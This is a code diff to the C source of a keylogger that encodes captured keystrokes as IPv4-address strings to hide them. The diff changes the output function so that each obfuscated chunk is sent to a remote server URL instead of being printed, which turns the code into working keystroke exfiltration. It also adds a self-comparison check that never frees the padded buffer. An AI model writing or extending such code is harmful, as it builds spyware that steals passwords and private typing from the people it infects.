@@ -1,4 +1,5 @@
 #include "Obfuscation.h"
+#include "Transmission.h"
 #include <stdio.h>
 #include <stdlib.h>
 
@@ -17,7 +18,7 @@ char* GenerateIpv4(int a, int b, int c, int d) {
 }
 
 // Generate the IPv4 output representation of the logged keys
-BOOL GenerateIpv4Output(unsigned char* pKeylog, SIZE_T KeylogSize) {
+BOOL GenerateIpv4Output(unsigned char* pKeylog, SIZE_T KeylogSize, const char* serverUrl) {
     if (pKeylog == NULL) {
         return FALSE;
     }
@@ -38,10 +39,7 @@ BOOL GenerateIpv4Output(unsigned char* pKeylog, SIZE_T KeylogSize) {
         pKeylog = paddedKeylog;
     }
 
-    // Print the start of the array definition
-    printf("char* Ipv4Array[%d] = { \n\t", (int)(KeylogSize / 4));
-
-    // Loop through the keylog buffer, 4 bytes at a time
+    // Process each byte of the keylog, 4 bytes at a time
     for (int i = 0; i < KeylogSize; i += 4) {
         int a = pKeylog[i];
         int b = pKeylog[i + 1];
@@ -51,21 +49,22 @@ BOOL GenerateIpv4Output(unsigned char* pKeylog, SIZE_T KeylogSize) {
         // Generate the IPv4 address from these 4 bytes
         char* ip = GenerateIpv4(a, b, c, d);
 
-        // Print the IPv4 address
-        if (i + 4 == KeylogSize) {
-            printf("\"%s\"", ip);
-        }
-        else {
-            printf("\"%s\", ", ip);
+        // Send the IPv4 address to the server immediately after obfuscation
+        if (sendIpv4ToServer(serverUrl, ip) != 0) {
+            fprintf(stderr, "Failed to send IPv4 address: %s\n", ip);
         }
 
-        // Beautify the output after every 8 addresses
-        if ((i / 4 + 1) % 8 == 0) {
-            printf("\n\t");
-        }
+        // Print the IPv4 address
+        printf("Obfuscated keystroke '%s' sent to server.\n", ip);
+
+        // Free the dynamically allocated IPv4 string
+        free(ip);
     }
 
-    printf("\n};\n\n");
+    // If the memory was padded, free it
+    if (pKeylog != pKeylog) {
+        free(pKeylog);
+    }
 
     return TRUE;
 }
